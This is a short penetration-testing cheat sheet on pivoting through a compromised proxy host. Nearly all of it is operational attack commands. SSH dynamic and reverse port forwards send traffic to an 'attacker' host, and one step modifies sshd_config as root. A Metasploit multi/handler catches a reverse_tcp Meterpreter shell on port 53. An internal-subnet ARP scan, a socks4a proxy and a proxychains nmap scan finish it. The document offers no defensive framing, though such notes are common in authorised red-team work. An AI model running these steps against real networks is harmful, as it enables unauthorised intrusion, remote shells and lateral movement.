# Pivoting - SSH Socks Proxies with MSF Reverse TCP Payloads

* CASE1: Single User Access: Use OpenSSH local port forward mechanism by establishing a second SSH channel
* CASE2: Root Access: Modify OpenSSH configuration and use the remote port forward feature

## view Graphs
![Reverse Meterpreter Pivoting - 1](msf_reverse_meterpreter1.jpg)
![Reverse Meterpreter Pivoting - 2](msf_reverse_meterpreter2.jpg)


## CASE-1. low priv. user access on proxy
ssh -D 8181 blahh@proxy
ssh -L 4444:attacker:53 blahh@127.0.0.1 -g

## CASE-2.
Root Access on proxy
ssh -D 8181 -R 4444:attacker:53 root@proxy
echo "GatewayPorts yes" >> /etc/ssh/sshd_config && service ssh reload

# both CASE's cont here - attackers view:
msfconsole
set ReverseAllowProxy true
setg Proxies socks4:127.0.0.1:8181
use multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST attacker #192.168.2.102
set LPORT 53
exploit -j

# Windows - Pivot
## Discover new Hosts
use windows/gather/arp_scanner
set SESSION 1
route add 172.20.214.0 255.255.255.0 1
set RHOSTS 172.20.214.0/24
exploit

use server/socks4a
set SRVHOST 127.0.0.1
set SRVPORT 1080
run
cp /etc/proxychains.conf .
proxychains nmap -Pn -n -sT 172.20.214.10 -sV --version-all | grep -v " <--denied\|NSOCK INFO" | tee -a pivot-scan.log

tags: proxychains ssh
